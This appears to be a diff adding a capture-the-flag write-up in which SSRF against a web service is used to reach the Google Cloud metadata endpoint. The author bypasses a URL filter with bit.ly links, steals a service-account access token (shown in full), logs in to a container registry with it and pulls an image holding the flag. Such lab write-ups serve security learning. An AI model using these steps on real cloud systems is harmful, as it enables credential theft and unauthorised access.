@@ -1,0 +1,53 @@
+bit.ly to bypass filters
+
+E.g
+	http://metadata.google.internal/
+	=> https://bit.ly/2MDZxWN
+
+	http://metadata.google.internal/computeMetadata/
+	=> https://bit.ly/2Z5s6Pb
+
+	http://metadata.google.internal/computeMetadata/v1/instance/
+	=> https://bit.ly/3tQs3oS
+
+	http://metadata.google.internal/computeMetadata/v1beta1/instance/
+	=> https://bit.ly/3a4lYgK
+
+	http://metadata.google.internal/computeMetadata/v1beta1/instance/?recursive=true
+	=> https://bit.ly/3p2OpQj
+
+	http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
+	=> https://bit.ly/3rBT90V
+
+Post to https://waas.dicec.tf/ with bit.ly
+	http://metadata.google.internal/computeMetadata/v1/instance/
+		403 not found
+
+	http://metadata.google.internal/computeMetadata/v1beta1/instance/
+		nothing shown
+
+	# snap1
+	http://metadata.google.internal/computeMetadata/v1beta1/instance/?recursive=true
+		There's a docker image `gcr.io/dicegang-waas/waas`
+
+	# snap2
+	http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
+		Get token
+
+
+tesseract snap2.png output
+	{Yaccess_token":"ya29.c.KoOB8QF7nQGBnY 4wGhmGalr BsNiaoOKWO7LN17tCjiDRr ObDyeI51mj9m2AQdICKFJdUW99k10ceCQFxi vWsHLEnM5Qz1yxQD85TJG1DF J3ZEdsHyFMY7Y3Pk610RQG3x1dCZNKSNZSqSDNLtyEWyWNxgOP4boL_SEC7EnjZBw-mmNESV6gtA5S5g0j8ti2Nr", "expires_in":2293, "token_type":"Bearer"}
+
+Correct the token manually
+	ya29.c.Ko0B8Qf7nQGBnY1wGhmGalrBsNiao9KWO7LNl7tCjiDRrObDyeI5lmj9m2AQdJCkFJdUw99klOceCQFxivWsHLFnM5Qz1yxQD85TJG1DFJ3ZEdsHyFMY7Y3Pk61ORQG3xldCZNk5NZ5qSbNLtyEWyWNxgOP1boL_5EC7FnjZBw-mmNE3V6gtA55gOj8ti2Nr
+
+Pull the image with docker auth
+	docker login -u oauth2accesstoken -p "ya29.c.Ko0B8Qf7nQGBnY1wGhmGalrBsNiao9KWO7LNl7tCjiDRrObDyeI5lmj9m2AQdJCkFJdUw99klOceCQFxivWsHLFnM5Qz1yxQD85TJG1DFJ3ZEdsHyFMY7Y3Pk61ORQG3xldCZNk5NZ5qSbNLtyEWyWNxgOP1boL_5EC7FnjZBw-mmNE3V6gtA55gOj8ti2Nr" https://gcr.io
+		Login Succeeded
+
+	docker pull gcr.io/dicegang-waas/waas
+
+Run docker
+	sudo docker run gcr.io/dicegang-waas/waas
+		dice{the_cloud_is_just_someone_elses_computer}
+
